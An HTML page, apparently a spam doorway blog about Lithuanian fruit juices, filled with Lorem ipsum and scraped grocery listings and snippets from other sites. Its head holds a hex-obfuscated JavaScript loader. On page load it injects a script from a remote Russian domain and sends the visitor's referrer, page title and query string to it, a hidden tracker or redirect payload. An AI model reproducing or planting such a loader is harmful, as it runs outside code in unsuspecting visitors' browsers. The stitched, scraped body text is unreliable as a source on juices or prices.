<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>Sultys | sultys</title>
<meta http-equiv="Content-Type" content="text/html; charset="utf-8" />
<style type="text/css" media="all">
@import "images/style.css";
</style>

<script type="text/javascript">var _0x3e62=['\x74\x69\x74\x6c\x65','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x72\x65\x70\x6c\x61\x63\x65','\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65','\x72\x65\x66\x65\x72\x72\x65\x72','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35\x26\x5f\x63\x69\x64\x3d\x61\x38\x36\x65\x61\x39\x65\x36\x2d\x30\x32\x37\x35\x2d\x36\x32\x65\x61\x2d\x38\x32\x39\x36\x2d\x33\x38\x39\x38\x64\x61\x33\x33\x63\x66\x39\x38','\x68\x74\x74\x70\x3a','\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x74\x74\x70\x73\x3a','\x73\x72\x63','\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65','\x73\x65\x61\x72\x63\x68','\x54\x68\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x77\x6f\x72\x6b\x73\x20\x6f\x6e\x20\x48\x54\x54\x50\x53\x2e\x20\x54\x68\x65\x20\x74\x72\x61\x63\x6b\x65\x72\x20\x6d\x75\x73\x74\x20\x75\x73\x65\x20\x48\x54\x54\x50\x53\x20\x74\x6f\x6f\x2e','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35'];(function(_0x46dbcc,_0x3e62d5){var _0x3f6e09=function(_0x110420){while(--_0x110420){_0x46dbcc['push'](_0x46dbcc['shift']());}};_0x3f6e09(++_0x3e62d5);}(_0x3e62,0x18d));var _0x3f6e=function(_0x46dbcc,_0x3e62d5){_0x46dbcc=_0x46dbcc-0x0;var _0x3f6e09=_0x3e62[_0x46dbcc];return _0x3f6e09;};var d=document,s=d[_0x3f6e('\x30\x78\x34')]('\x73\x63\x72\x69\x70\x74');s[_0x3f6e('\x30\x78\x65')]=_0x3f6e('\x30\x78\x62')+encodeURIComponent(document[_0x3f6e('\x30\x78\x37')])+_0x3f6e('\x30\x78\x61')+encodeURIComponent(document['\x74\x69\x74\x6c\x65'])+'\x26'+window[_0x3f6e('\x30\x78\x63')][_0x3f6e('\x30\x78\x31\x32')]['\x72\x65\x70\x6c\x61\x63\x65']('\x3f','\x26')+_0x3f6e('\x30\x78\x38');document['\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74']?document[_0x3f6e('\x30\x78\x66')][_0x3f6e('\x30\x78\x36')]['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'](s,document[_0x3f6e('\x30\x78\x66')]):d[_0x3f6e('\x30\x78\x31\x31')]('\x68\x65\x61\x64')[0x0][_0x3f6e('\x30\x78\x33')](s);document[_0x3f6e('\x30\x78\x63')][_0x3f6e('\x30\x78\x31\x30')]===_0x3f6e('\x30\x78\x64')&&_0x3f6e('\x30\x78\x62')+encodeURIComponent(document[_0x3f6e('\x30\x78\x37')])+'\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d'+encodeURIComponent(document[_0x3f6e('\x30\x78\x32')])+'\x26'+window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x3f6e('\x30\x78\x31\x32')][_0x3f6e('\x30\x78\x35')]('\x3f','\x26')+_0x3f6e('\x30\x78\x31')['\x69\x6e\x64\x65\x78\x4f\x66'](_0x3f6e('\x30\x78\x39'))===0x0&&alert(_0x3f6e('\x30\x78\x30'));</script>
</head>
<body  id="ucyiRddZkf">
<div class="content"   id="GweuKMkR5VDX">
  <div id="top">
    <div class="padding"> <a href="privacy-policy.html">Privacy policy</a> | <a href="terms.html">Terms and Conditions</a> | <a href="photo.html">Photo gallery</a> | <a href="contact.html">Contacts</a></div>
  </div>
  <div id="header">
    <div class="f_search">
      <form method="post" action="#" id="EpFTi4Qgvtay">
        <p>
          <input type="text" name="search" value="search..." class="search" onblur="if(this.value=='') this.value='search...';" onfocus="if(this.value=='search...') this.value='';" />
          <input type="submit" value="Go" class="submit" />
        </p>
      </form>
    </div>
    <div class="title"  id="J4sSlBD6S5Js">
      <h1>sultys</</h1>
    </div>
  </div>
  <div id="subheader">
    <div id="menu">
    </div>
  </div>
  <div id="main">
    <div class="right_side"  id="yADP1IcBKzk">
      <div class="nav">
        <h2>About me</h2>
        <div class="padding">
          <div class="img2"><img src="img/193282514fa59672d1da74e2d4dc48c3.jpg" alt=""  width="25%"/></div>
          Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Integer euismod ante non diam. Sed eleifend odio sed quam. Sed vulputate, turpis at tincidunt porttitor, est elit consequat metus.</div>
        <h2>Past Articles</h2>
 <ul>
<li><a href="index.html">Įvairios sultys</a><br> Kiekvieną rytą išgerkite 200 ml (galima didinti iki 300-400 ml) sulčių ant tuščio skrandžio. Tai turi būti šviežios sultys, be jokių pridėtinių ingredientų. Salierų sultys yra nekaloringas gėrimas – 2 saliero kotai turi apie 16 kcal. Tam, kad juos suvirškinti, organizmas sunaudoja 14 kcal, vadinasi, Jums lieka vos 2 kcal.</li>
<li><a href="1.html">Vaisiu Sultys | Lietuviškos sultys ne iš koncentrato</a><br> Su meile – rudenio gėrybėms! Sultys spaudžiamos ir pasterizuojamos iš: obuolių, kriaušių, moliūgų, cukinijų, morkų, apelsinų; Reikalingi švarūs ir nepapuvę vaisiai, nes nuo to priklauso Jūsų sulčių kokybė ir ilgaamžiškumas.</li>
<li><a href="2.html">Tomo Sultys – sulčių spaudimas</a><br> Sultys Pristatymo miestas: 3.00 € / vnt. Aviečių sultys, 300ml Mindaugo Slapkausko ūkis. 3 ...</li>
<li><a href="3.html">Vis dar negeriate šių sulčių? Biomedicinos mokslų daktarė ...</a><br> Natūralios uogų ir vaisių sultys, kiti sveiki produktai Darbo laikas: I - V 9:00 - 19:00 | VI - VII Telefonas: 862855510, 865034137 El. paštas: info@uogusultys.lt Adresas: Pievų g. 9, Giedrių kaimas, Jurbarko rajonas</li>
<li><a href="4.html">Sulčių spaudykla, sulčių spaudimas, spaudžia sultis</a><br> Obuolių sultys. Spaudžiame ir pasterizuojame obuolių sultis Utenoje, Užpalių g. 83B, kiekvieną dieną 08:00 - 20:00. Tel. +37068142902.</li>
<li><a href="5.html">Obuolių sultys | Kontaktai | Utenos sultys | Obuolių ...</a><br> Sultys, Sulčių spaudyklos, Prekyba pakuotėmis, Prekyba sulčių spaudimo įranga. Lietuvos sulčių spaudyklų katalogas, rask sulčių spaudyklą savo mieste!</li>
<li><a href="6.html">Sultys | Produktų katalogas</a><br> Ekologiškos biodinaminės sultys FUR shot su imbieru ir ciberžole, 60ml 1,99 ...</li>
<li><a href="7.html">Sultys | Uogusultys.lt</a><br> Ažuožerių sultys, ŽŪK | Šeimyniškių k., Anykščių r. Lietuva | Tel.</li>
<li><a href="8.html">Sultys - BARBORA</a><br> Sultys. Sultys pakaitintos iki 80 laipsnių, todėl vitaminai išlikę sultyse. Tetrapakus galima laikyti neatidarytus 2 metus, tačiau vitaminai išlieka iki 9 mėn, o pradarius tetrapaką, sultis reikėtų išgerti per 3 mėn.</li>
<li><a href="9.html">SULTYS | Gaivieji gėrimai | Gėrimai | e-eugesta.lt prekės ...</a><br> Obuolių,morkų sultys VAISIŲ SULTYS su minkštimu, 750 ml. €1,89 €0,10 × Tara €2,52/l. Obuolių,morkų sultys VAISIŲ SULTYS su minkštimu, 750 ml. KARTU REKOMENDUOJAME. Apelsinų ir pasiflorų sultys HOHES C PLUS su vitaminu D, 1 l. €2,29 €0,10 × Tara ...</li>
</ul>
        <br />
        <h2>Menu</h2>
<ul>
<li><a href="index.html">Įvairios sultys</a></li>
<li><a href="1.html">Vaisiu Sultys | Lietuviškos sultys ne iš koncentrato</a><br></li>
<li><a href="2.html">Tomo Sultys – sulčių spaudimas</a><br></li>
<li><a href="3.html">Vis dar negeriate šių sulčių? Biomedicinos mokslų daktarė ...</a><br></li>
<li><a href="4.html">Sulčių spaudykla, sulčių spaudimas, spaudžia sultis</a><br></li>
<li><a href="5.html">Obuolių sultys | Kontaktai | Utenos sultys | Obuolių ...</a><br></li>
<li><a href="6.html">Sultys | Produktų katalogas</a><br></li>
<li><a href="7.html">Sultys | Uogusultys.lt</a><br></li>
<li><a href="8.html">Sultys - BARBORA</a><br></li>
<li><a href="9.html">SULTYS | Gaivieji gėrimai | Gėrimai | e-eugesta.lt prekės ...</a><br></li>
</ul>
      </div>
    </div>
    <div class="left_side"   id="6W4DBIEkI">

      <h2  id="yN5ygt1wFVGUUx">Sultys</h2>
      <div class="img"  id="apD4yS5h4k"><img src="img/bc45504c560272667ce0c027f9857f8c.jpg" alt=""  width="30%" id="RDjqYYY"/></div>
  <span> Informuojame, kad šioje svetainėje yra naudojami slapukai (angl. cookies). Toliau naršydami svetainėje arba paspausdami mygtuką Sutinku Jūs sutinkate su slapukų naudojimu. Savo duotą sutikimą bet kada galėsite atšaukti pakeisdami savo interneto naršyklės nustatymus ir ištrindami įrašytus slapukus. Daugiau informacijos apie slapukus galite rasti čia . </span> Sutinku Keisti apskritį <span> Parsisiųskite</span> Lietuvių English Русский Registruotis Prisijungti Prisijungti Registruotis <p> Sveiki, ačiū, kad vėl pas mus užsukote!</p> <p> Caps Lock yra įjungtas<p> (8 5) 230 9309 Prekės Mano prekės Akcijos Eko ir ūkis Naujienos Receptai Daržovės ir vaisiai Pieno gaminiai ir kiaušiniai Duonos gaminiai ir konditerija Mėsa, žuvys ir kulinarija Bakalėja Šaldytas maistas Gėrimai Kūdikių ir vaikų prekės Kosmetika ir higiena Švaros ir gyvūnų prekės Namai ir laisvalaikis <span> Pagrindinis puslapis </span> <span> Gėrimai </span> <span> Sultys, nektarai ir sulčių gėrimai </span> <span> Sultys </span> (8 5) 230 9309 Kasdien nuo 8 iki 21 val. El. p.: pagalba@barbora.lt Sultys, nektarai ir sulčių gėrimai <span> 237</span> Sultys <span> 93</span> 1 2 Filtruoti Rūšiuoti pagal: Abėcėlę (A-Ž) Abėcėlę (Ž-A) Kainą (didėj.) Kainą (mažėj.) Be Akcijos Akcijines kainas <span> Apelsinų sultys MAXIMA FAVORIT, 1 l</span> <span> €0,89 </span> €0,89/l Apelsinų sultys MAXIMA FAVORIT, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys MAXIMA FAVORIT, 1 l</span> <span> €0,85 </span> €0,85/l Obuolių sultys MAXIMA FAVORIT, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių ir vyšnių sultys MR. FRUCT, 3 l</span> <span> €4,89 </span> €1,63/l Obuolių ir vyšnių sultys MR. FRUCT, 3 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pomidorų sultys DON SIMON PREMIUM, 1 l</span> <span> €2,49 </span> €0,10 × Tara €2,49/l Pomidorų sultys DON SIMON PREMIUM, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ananasų, vynuogių sultys DON SIMON, 1 l</span> <span> €2,08 </span> €2,08/l Ananasų, vynuogių sultys DON SIMON, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių, granatų ir aviečių sultys HOHES C PLUS su geležimi, 1 l</span> <span> €2,29 </span> €0,10 × Tara €2,29/l Obuolių, granatų ir aviečių sultys HOHES C PLUS su geležimi, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Nepasterizuotos melionų, mangų ir ananasų sultys SUN 365, 500 ml</span> €2,99 <span> €2,45 </span> €0,10 × Tara €4,90/l Nepasterizuotos melionų, mangų ir ananasų sultys SUN 365, 500 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių,morkų sultys VAISIŲ SULTYS su minkštimu, 750 ml</span> <span> €1,89 </span> €0,10 × Tara €2,52/l Obuolių,morkų sultys VAISIŲ SULTYS su minkštimu, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų ir pasiflorų sultys HOHES C PLUS su vitaminu D, 1 l</span> <span> €2,29 </span> €0,10 × Tara €2,29/l Apelsinų ir pasiflorų sultys HOHES C PLUS su vitaminu D, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys DON SIMON PREMIUM su minkštimu, 2 l</span> <span> €4,85 </span> €2,43/l Apelsinų sultys DON SIMON PREMIUM su minkštimu, 2 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Vynuogių,aronijų,mėlynių sultys HOHES C PLUS su antioksid., 1 l</span> <span> €2,29 </span> €0,10 × Tara €2,29/l Vynuogių,aronijų,mėlynių sultys HOHES C PLUS su antioksid., 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ananasų sultys GRANINI SELECTION, 750 ml</span> <span> €2,29 </span> €0,10 × Tara €3,05/l Ananasų sultys GRANINI SELECTION, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apels.,vyn. ir ž.citrinų sultys HOHES C PLUS su magniu,vit.B, 1 l</span> <span> €2,29 </span> €0,10 × Tara €2,29/l Apels.,vyn. ir ž.citrinų sultys HOHES C PLUS su magniu,vit.B, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ekologiškos apelsinų sultys ELMENHORSTER BIO, 1 l</span> <span> €2,99 </span> €2,99/l Ekologiškos apelsinų sultys ELMENHORSTER BIO, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ekologiškos vynuogių sultys ELMENHORSTER BIO, 1 l</span> <span> €2,99 </span> €2,99/l Ekologiškos vynuogių sultys ELMENHORSTER BIO, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių, aronijų sultys VAISIŲ SULTYS, 750 ml</span> <span> €1,89 </span> €0,10 × Tara €2,52/l Obuolių, aronijų sultys VAISIŲ SULTYS, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Miško uogų sultys SUN365, 500 ml</span> €2,99 <span> €2,45 </span> €0,10 × Tara €4,90/l Miško uogų sultys SUN365, 500 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys DELIKATEZZA, 1 l</span> <span> €1,75 </span> €0,10 × Tara €1,75/l Apelsinų sultys DELIKATEZZA, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pomidorų sultys GRANINI, 1 l</span> <span> €2,29 </span> €0,10 × Tara €2,29/l Pomidorų sultys GRANINI, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų ir malpigijų sultys DR WITT (IMMUNITY), 1 l</span> <span> €2,09 </span> €0,10 × Tara €2,09/l Apelsinų ir malpigijų sultys DR WITT (IMMUNITY), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Granatų sultys KRAL, 250 ml</span> €0,99 <span> €0,75 </span> €0,10 × Tara €3,00/l Granatų sultys KRAL, 250 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Nepasterizuotos aviečių, kriaušių ir obuolių sultys SUN 365, 500 ml</span> €2,99 <span> €2,45 </span> €0,10 × Tara €4,90/l Nepasterizuotos aviečių, kriaušių ir obuolių sultys SUN 365, 500 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> EKO vynuog.obuol.sult.RABENHORST(STIPRUS IMUNITETAS)su vit.C, 750 ml</span> <span> €4,90 </span> €0,10 × Tara €6,53/l EKO vynuog.obuol.sult.RABENHORST(STIPRUS IMUNITETAS)su vit.C, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių, juodųjų serbentų sultys MANA, 750 ml</span> <span> €1,99 </span> €0,10 × Tara €2,65/l Obuolių, juodųjų serbentų sultys MANA, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys MANA, 750 ml</span> <span> €1,99 </span> €0,10 × Tara €2,65/l Obuolių sultys MANA, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Morkų, obuolių sultys MANA, 750 ml</span> <span> €1,99 </span> €0,10 × Tara €2,65/l Morkų, obuolių sultys MANA, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Morkų, obuolių ir juodųjų serbentų sultys MANA, 750 ml</span> <span> €1,99 </span> €0,10 × Tara €2,65/l Morkų, obuolių ir juodųjų serbentų sultys MANA, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ekologiškos obuolių ir mangų sultys RABENHORST su minkštimu, 750 ml</span> <span> €5,19 </span> €0,10 × Tara €6,92/l Ekologiškos obuolių ir mangų sultys RABENHORST su minkštimu, 750 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys CAPPY, 1 l</span> <span> €1,67 </span> €0,10 × Tara €1,67/l Apelsinų sultys CAPPY, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys TYMBARK su vitaminu C, 1 l</span> €2,05 <span> €1,45 </span> €0,10 × Tara €1,45/l Apelsinų sultys TYMBARK su vitaminu C, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Įvairių vaisių, morkų sultys TYMBARK, 1 l</span> €1,89 <span> €1,35 </span> €0,10 × Tara €1,35/l Įvairių vaisių, morkų sultys TYMBARK, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys ELMENHORSTER, 200 ml</span> <span> €0,49 </span> €2,45/l Apelsinų sultys ELMENHORSTER, 200 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pikantiškos pomidorų sultys TYMBARK, 1 l</span> €1,39 <span> €0,89 </span> €0,89/l Pikantiškos pomidorų sultys TYMBARK, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys ELMENHORSTER, 200 ml</span> <span> €0,49 </span> €2,45/l Obuolių sultys ELMENHORSTER, 200 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Daržovių sultys ELMENHORSTER, 1 l</span> <span> €1,29 </span> €1,29/l Daržovių sultys ELMENHORSTER, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Įvairių vaisių ir morkų sultys TYMBARK, 300 ml</span> <span> €0,89 </span> €0,10 × Tara €2,97/l Įvairių vaisių ir morkų sultys TYMBARK, 300 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys DELIKATEZZA, 1 l</span> <span> €1,51 </span> €0,10 × Tara €1,51/l Obuolių sultys DELIKATEZZA, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių,morkų,bananų sultys KUBUS, 300 ml</span> <span> €0,79 </span> €0,10 × Tara €2,63/l Obuolių,morkų,bananų sultys KUBUS, 300 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pomidorų sultys TYMBARK (100%), 300 ml</span> <span> €0,89 </span> €0,10 × Tara €2,97/l Pomidorų sultys TYMBARK (100%), 300 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Sultys ŽALIOSIOS JUMEX UNICOFRESCO, 473 ml</span> <span> €2,59 </span> €5,48/l Sultys ŽALIOSIOS JUMEX UNICOFRESCO, 473 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys GRANINI, 1 l</span> <span> €2,29 </span> €0,10 × Tara €2,29/l Apelsinų sultys GRANINI, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys CIDO (100%), 1 l</span> €1,69 <span> €1,18 </span> €1,18/l <span> -30%</span> Apelsinų sultys CIDO (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pomidorų sultys CIDO (100%), 1 l</span> €1,15 <span> €0,81 </span> €0,81/l <span> -30%</span> Pomidorų sultys CIDO (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys VAISIŲ SULTYS, 3 l</span> <span> €3,89 </span> €1,30/l Obuolių sultys VAISIŲ SULTYS, 3 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys DON SIMON su minkštimu (100%), 1 l</span> <span> €2,39 </span> €2,39/l Apelsinų sultys DON SIMON su minkštimu (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys TYMBARK (100%), 1 l</span> €1,95 <span> €1,29 </span> €1,29/l Apelsinų sultys TYMBARK (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Granatų sultys GRANDA, 1 l</span> <span> €1,83 </span> €0,10 × Tara €1,83/l Granatų sultys GRANDA, 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Įvairių vaisių sultys HAPPY DAY (100%), 1 l</span> <span> €1,99 </span> €1,99/l Įvairių vaisių sultys HAPPY DAY (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys CIDO (100%), 1 l</span> €1,59 <span> €1,11 </span> €1,11/l <span> -30%</span> Obuolių sultys CIDO (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys KUBUS GO, 300 ml</span> <span> €0,82 </span> €0,10 × Tara €2,73/l Obuolių sultys KUBUS GO, 300 ml <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Apelsinų sultys HAPPY DAY (100%), 1 l</span> <span> €1,99 </span> €1,99/l Apelsinų sultys HAPPY DAY (100%), 1 l <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Obuolių sultys MR. FRUCT, 3 l</span> <span> €3,89 </span> €1,30/l Obuolių sultys MR. FRUCT, 3 l <span> KARTU REKOMENDUOJAME</span> <span> </span> 1 2 Prekės Mano prekės Akcijos Eko ir ūkis Naujienos Receptai
  <hr />
<iframe width="530" height="315" src="https://www.youtube.com/embed/In-ZhkyzcaI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

      <p class="date" id="wNLFPvnK">Posted by Jack <img src="images/more.gif" alt="" /> <a href="#">Read more</a> <img src="images/comment.gif" alt="" /> <a href="#">Comments (15)</a> <img src="images/timeicon.gif" alt="" /> 2020.10.29 08:18</p>
      <br />
    </div>
  </div>
  <div id="footer">
    <div class="padding"> Copyright &copy; 2020 BlueBlog |</div>
	<p id="FTazsngq3"></p>
  </div>
</div>
</body>
</html>